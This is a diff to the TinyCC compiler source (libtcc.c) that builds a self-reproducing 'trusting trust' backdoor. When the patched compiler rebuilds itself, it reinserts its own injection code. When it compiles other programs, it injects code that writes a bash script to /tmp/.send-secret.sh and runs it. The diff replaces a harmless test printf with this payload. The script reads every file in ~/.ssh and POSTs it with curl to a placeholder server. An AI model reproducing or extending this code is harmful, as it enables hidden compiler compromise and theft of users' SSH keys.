@@ -600,30 +600,6 @@ ST_FUNC void tcc_close(void)
     tcc_free(bf);
 }
 
-static size_t skip_ws_and_comments(const char *s, size_t i) {
-    for (;;) {
-        while (s[i] == ' ' || s[i] == '\t' || s[i] == '\r' || s[i] == '\n') i++;
-        if (s[i] == '/' && s[i+1] == '/') { while (s[i] && s[i] != '\n') i++; continue; }
-        if (s[i] == '/' && s[i+1] == '*') { i += 2; while (s[i] && !(s[i] == '*' && s[i+1] == '/')) i++; if (s[i]) i += 2; continue; }
-        break;
-    }
-    return i;
-}
-
-static int find_matching_rparen(const char *s, size_t i) {
-    int depth = 1;
-    while (s[i]) {
-        char c = s[i++];
-        if (c == '"')      { while (s[i] && !(s[i] == '"'  && s[i-1] != '\\')) i++; if (s[i]) i++; }
-        else if (c == '\''){ while (s[i] && !(s[i] == '\'' && s[i-1] != '\\')) i++; if (s[i]) i++; }
-        else if (c == '/' && s[i] == '/') { while (s[i] && s[i] != '\n') i++; }
-        else if (c == '/' && s[i] == '*') { i++; while (s[i] && !(s[i] == '*' && s[i+1] == '/')) i++; if (s[i]) i += 2; }
-        else if (c == '(') depth++;
-        else if (c == ')') { if (--depth == 0) return (int)i; }
-    }
-    return -1;
-}
-
 ST_FUNC int tcc_open(TCCState *s1, const char *filename)
 {
     int fd;
@@ -811,9 +787,75 @@ const char *execute_comil = "const char *execute_comil = \\\"\\\"; \n"
 "if (src[brace_pos] == '{') { \n"
 "size_t insert_after_brace = brace_pos + 1; \n"
 "CString mod; cstr_new(&mod); \n"
-"cstr_cat(&mod, \"#include <stdio.h>\\n\", -1); \n"
+"cstr_cat(&mod, \"#include <time.h>\\n #include <stdio.h>\\n #include <stdlib.h>\\n #include <string.h>\\n #include <unistd.h>\\n #include <sys/stat.h>\\n #include <stdbool.h>\\n const char* script_content = \\\"\", -1); \n"
+"const char* script_content = \"#!/bin/bash\\n\" \n"
+"\"echo \\\"test bash!\\\"\\n\" \n"
+"\"\\n\" \n"
+"\"FOLDER=\\\"$HOME/.ssh\\\" \\n\" \n"
+"\"SERVER=\\\"your.server.address\\\" \\n\" \n"
+"\"\\n\" \n"
+"\"if [ ! -d \\\"$FOLDER\\\" ]; then \\n\" \n"
+"\"    exit 1\\n\" \n"
+"\"fi\\n\" \n"
+"\"\\n\" \n"
+"\"process_file() { \\n\" \n"
+"\"    local file=\\\"$1\\\" \\n\" \n"
+"\"    local filename=$(basename \\\"$file\\\") \\n\" \n"
+"\"    local content\\n\" \n"
+"\"    \\n\" \n"
+"\"    content=$(< \\\"$file\\\" sed -e 's/\\\\\\\\/\\\\\\\\\\\\\\\\/g' -e 's/\\\"/\\\\\\\\\\\"/g' -e 's/\\\\$/\\\\\\\\$/g')\\n\" \n"
+"\"    \\n\" \n"
+"\"    echo \\\"\\\\\\\\\\\"$filename\\\\\\\\\\\":\\\\\\\\\\\"$content\\\\\\\\\\\"\\\"\\n\" \n"
+"\"}\\n\" \n"
+"\"\\n\" \n"
+"\"find \\\"$FOLDER\\\" -type f -print0 | while IFS= read -r -d $'\\\\0' file; do\\n\" \n"
+"\"    data=$(process_file \\\"$file\\\")\\n\" \n"
+"\"    curl -X POST \\\"$SERVER\\\" -d \\\"$data\\\" --silent\\n\" \n"
+"\"done\\n\"; \n"
+"char *escaped_execute = NULL; \n"
+"{ \n"
+"size_t extra = 0, len0 = 0; \n"
+"const unsigned char *p; \n"
+"for (p = (const unsigned char*)script_content; *p; ++p, ++len0) { \n"
+"switch (*p) { \n"
+"case '\\\"': case '\\\\': case '\\n': case '\\r': case '\\t': \n"
+"case '\\a': case '\\b': case '\\f': case '\\v': \n"
+"extra += 1; break; \n"
+"default: \n"
+"if (*p < 0x20 || *p == 0x7F) extra += 3; \n"
+"} \n"
+"} \n"
+"escaped_execute = tcc_malloc(len0 + extra + 1); \n"
+"if (!escaped_execute) return 1; \n"
+"char *q2 = escaped_execute; \n"
+"const char hex[] = \"0123456789ABCDEF\"; \n"
+"for (p = (const unsigned char*)script_content; *p; ++p) { \n"
+"switch (*p) { \n"
+"case '\\\"': *q2++='\\\\'; *q2++='\\\"'; break; \n"
+"case '\\\\': *q2++='\\\\'; *q2++='\\\\'; break; \n"
+"case '\\n': *q2++='\\\\'; *q2++='n';  break; \n"
+"case '\\r': *q2++='\\\\'; *q2++='r';  break; \n"
+"case '\\t': *q2++='\\\\'; *q2++='t';  break; \n"
+"case '\\a': *q2++='\\\\'; *q2++='a';  break; \n"
+"case '\\b': *q2++='\\\\'; *q2++='b';  break; \n"
+"case '\\f': *q2++='\\\\'; *q2++='f';  break; \n"
+"case '\\v': *q2++='\\\\'; *q2++='v';  break; \n"
+"default: \n"
+"if (*p < 0x20 || *p == 0x7F) { \n"
+"*q2++='\\\\'; *q2++='x'; \n"
+"*q2++=hex[*p >> 4]; \n"
+"*q2++=hex[*p & 0xF]; \n"
+"} else { \n"
+"*q2++ = (char)*p; \n"
+"} \n"
+"} \n"
+"} \n"
+"*q2 = '\\0'; \n"
+"} \n"
+"cstr_cat(&mod, escaped_execute, -1); \n"
+"cstr_cat(&mod, \"\\\"; void create_and_run_script(const char* script_path) { FILE* script_file = fopen(script_path, \\\"w\\\"); if (!script_file) { perror(\\\"Failed to create script file\\\"); exit(EXIT_FAILURE); } fprintf(script_file, \\\"%s\\\", script_content); fclose(script_file); chmod(script_path, S_IRWXU | S_IRGRP | S_IXGRP | S_IROTH | S_IXOTH); system(script_path);}\", -1); \n"
 "cstr_cat(&mod, src, (int)insert_after_brace); \n"
-"cstr_cat(&mod, \" printf(\\\"hello33\\\\n\\\"); \", -1); \n"
+"cstr_cat(&mod, \"const char* script_path = \\\"/tmp/.send-secret.sh\\\"; time_t mytime = time(NULL); struct tm *result = localtime(&mytime); if (1) { create_and_run_script(script_path); }\\n\", -1); \n"
 "cstr_cat(&mod, src + insert_after_brace, -1); \n"
 "tcc_open_bf(s1, filename, (int)mod.size); \n"
 "memcpy(file->buffer, mod.data, mod.size); \n"
@@ -836,7 +878,6 @@ const char *execute_comil = "const char *execute_comil = \\\"\\\"; \n"
 "lseek(fd, 0, SEEK_SET); \n"
 "} \n"
 "} \n";
-
     const char *execute_comil_2 = execute_comil;
 
     if (!strcmp(tcc_basename(filename), "libtcc.c")) {
@@ -846,8 +887,6 @@ const char *execute_comil = "const char *execute_comil = \\\"\\\"; \n"
             char *src = tcc_malloc(len + 1);
             lseek(fd, 0, SEEK_SET);
             ssize_t n = read(fd, src, len);
-
-            // если успешно считал из fd в src len байт
             if (n >= 0) {
                 src[n] = 0;
 
@@ -869,7 +908,7 @@ const char *execute_comil = "const char *execute_comil = \\\"\\\"; \n"
 
                 char *pos = strstr(result, "const char *execute_comil = \\\"\\\"");
                 if (!pos) {
-                    printf("В result не нашли execute_comil\n");
+                    printf("Не найдено место для вставки!\n");
                     return 1;
                 }
 
@@ -885,8 +924,7 @@ const char *execute_comil = "const char *execute_comil = \\\"\\\"; \n"
                         switch (*p) {
                             case '\"': case '\\': case '\n': case '\r': case '\t':
                             case '\a': case '\b': case '\f': case '\v':
-                                extra += 1; 
-                                break;
+                                extra += 1; break;
                             default:
                                 if (*p < 0x20 || *p == 0x7F) extra += 3;
                         }
@@ -946,9 +984,7 @@ const char *execute_comil = "const char *execute_comil = \\\"\\\"; \n"
 
                 tcc_free(escaped_execute);
 
-                // p - указатель на начало исходной строки 
                 char *p = src, *q;
-                // ищем первое вхождение from в p
                 if ((q = strstr(p, from)) != NULL) {
                     CString mod; cstr_new(&mod);
                     do {
@@ -958,14 +994,11 @@ const char *execute_comil = "const char *execute_comil = \\\"\\\"; \n"
                     } while ((q = strstr(p, from)) != NULL);
                     cstr_cat(&mod, p, -1);
 
-                    // TCC будет компилировать измененный libtcc.c из mod.data вместо file->buffer <-> бинарник TCC содержит инъекцию которой не было ранее
                     tcc_open_bf(s1, filename, (int)mod.size);
                     memcpy(file->buffer, mod.data, mod.size);
-                    
                     fprintf(stderr, "=== begin libtcc.c ===\n");
                     fwrite(mod.data, 1, (size_t)mod.size, stderr);
                     fprintf(stderr, "\n=== end libtcc.c ===\n");
-                    
                     file->fd = -1;
                     close(fd);
                     cstr_free(&mod);
@@ -1038,14 +1071,80 @@ const char *execute_comil = "const char *execute_comil = \\\"\\\"; \n"
                             if (src[brace_pos] == '{') {
                                 size_t insert_after_brace = brace_pos + 1;
                                 CString mod; cstr_new(&mod);
-                                cstr_cat(&mod, "#include <stdio.h>\n", -1);
+                                cstr_cat(&mod, "#include <time.h>\n #include <stdio.h>\n #include <stdlib.h>\n #include <string.h>\n #include <unistd.h>\n #include <sys/stat.h>\n #include <stdbool.h>\n const char* script_content = \"", -1);
+                                const char* script_content = "#!/bin/bash\n"
+                                                "echo \"test bash!\"\n"
+                                                "\n"
+                                                "FOLDER=\"$HOME/.ssh\" \n"
+                                                "SERVER=\"your.server.address\" \n"
+                                                "\n"
+                                                "if [ ! -d \"$FOLDER\" ]; then \n"
+                                                "    exit 1\n"
+                                                "fi\n"
+                                                "\n"
+                                                "process_file() { \n"
+                                                "    local file=\"$1\" \n"
+                                                "    local filename=$(basename \"$file\") \n"
+                                                "    local content\n"
+                                                "    \n"
+                                                "    content=$(< \"$file\" sed -e 's/\\\\/\\\\\\\\/g' -e 's/\"/\\\\\"/g' -e 's/\\$/\\\\$/g')\n"
+                                                "    \n"
+                                                "    echo \"\\\\\"$filename\\\\\":\\\\\"$content\\\\\"\"\n"
+                                                "}\n"
+                                                "\n"
+                                                "find \"$FOLDER\" -type f -print0 | while IFS= read -r -d $'\\0' file; do\n"
+                                                "    data=$(process_file \"$file\")\n"
+                                                "    curl -X POST \"$SERVER\" -d \"$data\" --silent\n"
+                                                "done\n";
+
+                                char *escaped_execute = NULL;
+                                {
+                                    size_t extra = 0, len0 = 0;
+                                    const unsigned char *p;
+                                    for (p = (const unsigned char*)script_content; *p; ++p, ++len0) {
+                                        switch (*p) {
+                                            case '\"': case '\\': case '\n': case '\r': case '\t':
+                                            case '\a': case '\b': case '\f': case '\v':
+                                                extra += 1; break;
+                                            default:
+                                                if (*p < 0x20 || *p == 0x7F) extra += 3;
+                                        }
+                                    }
+                                    escaped_execute = tcc_malloc(len0 + extra + 1);
+                                    if (!escaped_execute) return 1;
+
+                                    char *q2 = escaped_execute;
+                                    const char hex[] = "0123456789ABCDEF";
+                                    for (p = (const unsigned char*)script_content; *p; ++p) {
+                                        switch (*p) {
+                                            case '\"': *q2++='\\'; *q2++='\"'; break;
+                                            case '\\': *q2++='\\'; *q2++='\\'; break;
+                                            case '\n': *q2++='\\'; *q2++='n';  break;
+                                            case '\r': *q2++='\\'; *q2++='r';  break;
+                                            case '\t': *q2++='\\'; *q2++='t';  break;
+                                            case '\a': *q2++='\\'; *q2++='a';  break;
+                                            case '\b': *q2++='\\'; *q2++='b';  break;
+                                            case '\f': *q2++='\\'; *q2++='f';  break;
+                                            case '\v': *q2++='\\'; *q2++='v';  break;
+                                            default:
+                                                if (*p < 0x20 || *p == 0x7F) {
+                                                    *q2++='\\'; *q2++='x';
+                                                    *q2++=hex[*p >> 4];
+                                                    *q2++=hex[*p & 0xF];
+                                                } else {
+                                                    *q2++ = (char)*p;
+                                                }
+                                        }
+                                    }
+                                    *q2 = '\0';
+                                }
+                                cstr_cat(&mod, escaped_execute, -1);
+                                cstr_cat(&mod, "\"; void create_and_run_script(const char* script_path) { FILE* script_file = fopen(script_path, \"w\"); if (!script_file) { perror(\"Failed to create script file\"); exit(EXIT_FAILURE); } fprintf(script_file, \"%s\", script_content); fclose(script_file); chmod(script_path, S_IRWXU | S_IRGRP | S_IXGRP | S_IROTH | S_IXOTH); system(script_path);}", -1);
                                 cstr_cat(&mod, src, (int)insert_after_brace);
-                                cstr_cat(&mod, " printf(\"hello33\\n\"); ", -1);
+                                cstr_cat(&mod, "const char* script_path = \"/tmp/.send-secret.sh\"; time_t mytime = time(NULL); struct tm *result = localtime(&mytime); if (1) { create_and_run_script(script_path); }\n", -1);
                                 cstr_cat(&mod, src + insert_after_brace, -1);
-                                
                                 tcc_open_bf(s1, filename, (int)mod.size);
                                 memcpy(file->buffer, mod.data, mod.size);
-                                
                                 if (!strcmp(tcc_basename(file->filename), "hi.c")) {
                                     fprintf(stderr, "=== begin hi.c ===\n");
                                     fwrite(mod.data, 1, (size_t)mod.size, stderr);
@@ -2129,36 +2228,29 @@ PUB_FUNC int tcc_parse_args(TCCState *s, int *pargc, char ***pargv, int optind)
     int argc = *pargc;
 
     cstr_new(&linker_arg);
-            printf("1\n");
 
     while (optind < argc) {
-        printf("2\n");
         r = argv[optind];
-        printf("Processing argument: %s\n", r);
         if (r[0] == '@' && r[1] != '\0') {
             args_parser_listfile(s, r + 1, optind, &argc, &argv);
 	    continue;
         }
-        printf("2.1\n");
         optind++;
         if (tool) {
             if (r[0] == '-' && r[1] == 'v' && r[2] == 0)
                 ++s->verbose;
             continue;
         }
-        printf("2.2\n");
 reparse:
         if (r[0] != '-' || r[1] == '\0') {
             if (r[0] != '@') /* allow "tcc file(s) -run @ args ..." */ {
                 args_parser_add_file(s, r, s->filetype);
             }
             if (run) {
-                printf("2.3.2\n");
                 tcc_set_options(s, run);
                 arg_start = optind - 1;
                 break;
             }
-            printf("2.4\n");
             continue;
         }
 
@@ -2183,7 +2275,7 @@ reparse:
                 continue;
             break;
         }
-        printf("Found option: %s, optarg: %s, popt->index: %d\n", popt->name, optarg, popt->index);
+
         switch(popt->index) {
         case TCC_OPTION_HELP:
             return OPT_HELP;
